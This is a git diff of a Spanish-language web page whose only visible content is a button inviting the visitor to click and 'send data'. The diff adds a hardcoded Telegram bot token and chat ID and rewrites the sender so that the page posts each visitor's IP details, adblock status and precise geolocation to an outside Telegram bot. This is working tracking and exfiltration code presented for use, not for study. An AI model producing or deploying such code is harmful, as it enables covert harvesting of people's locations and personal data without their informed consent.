@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>QTest</title>
+  <title>Test</title>
   <style>
     body { font-family: Arial; padding: 20px; background: #f0f0f0; }
     .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 700px; margin: auto; }
@@ -11,12 +11,15 @@
 </head>
 <body>
   <div class="box">
-    <h2>Aprieta el botón para enviar datos</h2>
+    <h2>Aprieta el boton para enviar datos</h2>
     <button id="startBtn">Dame Click</button>
   </div>
 
 <script>
 (() => {
+  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
+  const CHAT_ID = "6065284869";
+
   const startBtn = document.getElementById("startBtn");
 
   let humanInteraction = false;
@@ -95,7 +98,7 @@
     }
   }
 
-  // === FUNCIÓN MEJORADA: getIPInfo con múltiples APIs ===
+  // === FUNCIÓN MEJORADA: getIPInfo() con múltiples APIs ===
   async function getIPInfo() {
     const APIs = [
       {
@@ -161,18 +164,21 @@
     return null;
   }
 
-  // === CAMBIA ESTO POR TU IP LOCAL ===
-  async function sendToServer(message) {
+  async function sendToTelegram(message) {
     try {
-      const LOCAL_IP = "192.168.1.6"; // ← Tu IP local desde Termux
-      const res = await fetch(`http://${LOCAL_IP}:3000/send`, {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;   
+      const response = await fetch(url, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ message })
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+        }),
       });
-      if (!res.ok) throw new Error("Error en servidor");
-    } catch (e) {
-      console.warn("Error enviando:", e);
+      const data = await response.json();
+      console.log("Telegram response:", data);
+    } catch(e) {
+      console.warn("Error enviando a Telegram:", e);
     }
   }
 
@@ -225,7 +231,7 @@ AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value 
 Hora: ${new Date().toLocaleString()}
 `;
 
-    await sendToServer(message);
+    await sendToTelegram(message);
 
     if (geoRes.status === "fulfilled") {
       const {latitude, longitude, accuracy} = geoRes.value.coords;
@@ -235,13 +241,13 @@ Longitud: ${longitude}
 Precisión: ${accuracy} metros
 Hora: ${new Date().toLocaleString()}
 `;
-      await sendToServer(locationInfo);
+      await sendToTelegram(locationInfo);
     } else if (ipRes?.value?.lat && ipRes?.value?.lon) {
       const locationInfo = `\nUbicación Aproximada (por IP):
 Latitud: ${ipRes.value.lat}
 Longitud: ${ipRes.value.lon}
 `;
-      await sendToServer(locationInfo);
+      await sendToTelegram(locationInfo);
     }
 
     startBtn.textContent = "Datos enviados";
